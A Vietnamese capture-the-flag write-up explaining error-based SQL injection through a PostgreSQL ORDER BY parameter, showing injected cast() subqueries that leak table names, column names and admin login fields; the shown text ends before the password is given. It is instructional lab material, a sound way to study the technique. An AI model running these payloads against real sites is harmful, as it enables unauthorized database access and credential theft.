Chall này giới thiệu 1 loại sql injection mới: Error Based

Cách thức: cố tình thực hiện 1 câu sql có lỗi, làm hiển thị error message và qua error message ta sẽ biết được những thông tin cần tìm kiếm như tên bảng, tên cột,...

Một hàm có thể được sử dụng: `cast()`

Ví dụ cụ thể: cùng làm challenge này

Đương nhiên không dại gì fuzz ngay ở tab Authentication, chúng ta bấm vào tab Contents có nội dung:

> ------
>
> ### Contents List
>
> You need to be authenticated to access records

để ý URL có dạng `/?action=contents&order=ASC`, thêm 1 chữ A nữa vào đằng sau : `order=ASCA` và enter, ta được thông báo lỗi như sau:

> ERROR:  syntax error at or near "ASCA" LINE 1: ...out TO 100; COMMIT;SELECT * FROM contents order by page ASCA                                                                   ^

vậy ở đây đã lộ luôn cả câu truy vấn, nice. Theo đúng quy trình trong [link](https://www.exploit-db.com/docs/english/44348-error-based-sql-injection-in-order-by-clause-(mssql).pdf) tham khảo, ta thực hiện viết lại query với hàm cast để ép hiển thị lỗi:

`&order=ASC, cast((select table_name from information_schema.tables ) as int)`

lỗi:

> ERROR:  more than one row returned by a subquery used as an expression

vậy thêm limit 1 vào câu query trên,lỗi:

> ERROR:  invalid input syntax for integer: "m3mbr35t4bl3"

lỗi này hiện ra do tên bảng là 1 string trong khi ra đang cố cast nó về dạng int, vậy qua lỗi nay chúng ta biết được tên bảng là `m3mbr35t4bl3`

Tiếp tục viết câu truy vấn để xem tên cột:

`&order=ASC, cast((select column_name from information_schema.columns limit 1) as int)`

cột đầu tiên là id,không phải cột mình cần, muốn tìm các cột tiếp theo ta thêm offset 1, 2, 3,.. vào đằng sau limit 1

với offset 1, ta có cột `us3rn4m3_c0l`

với offset 2, ta có cột `p455w0rd_c0l`

có tên bảng, tên cột, tiếp tục truy vấn để lấy tài khoản admin:

`&order=ASC, cast((select us3rn4m3_c0l from m3mbr35t4bl3 limit 1) as int)`

`&order=ASC, cast((select p455w0rd_c0l from m3mbr35t4bl3 limit 1) as int)`

Mật khẩu admin:

